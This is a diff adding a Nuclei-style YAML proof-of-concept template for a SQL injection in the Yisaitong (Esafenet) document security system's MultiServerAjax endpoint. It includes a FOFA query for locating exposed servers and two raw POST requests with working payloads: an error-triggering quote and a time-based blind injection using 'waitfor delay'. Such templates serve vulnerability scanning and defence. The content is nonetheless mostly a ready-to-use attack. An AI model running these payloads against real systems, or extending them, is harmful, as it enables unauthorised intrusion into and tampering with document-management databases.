@@ -1,0 +1,48 @@
+id: poc-yaml-yisaitong-esafenet-multiserverajax-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 MultiServerAjax SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 亿赛通电子文档安全管理系统
+    fofa: body="/CDGServer3/index.jsp"
+variables:
+  t3: "{{rand_int(4, 7)}}"
+  t4: "{{to_number(t3) + 2}}"
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../MultiServerAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=delServer&serverId='
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "删除出错！"
+        part: body
+      - type: word
+        words:
+          - "删除出错！"
+        part: body
+  - raw:
+      - |
+        POST /CDGServer3/js/../MultiServerAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=delServer&serverId=-1'waitfor delay '0:0:{{t3}}'--
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration >= to_number(t3)"
+          - "duration <= to_number(t4)"
+      - type: word
+        words:
+          - "OK"
+        part: body
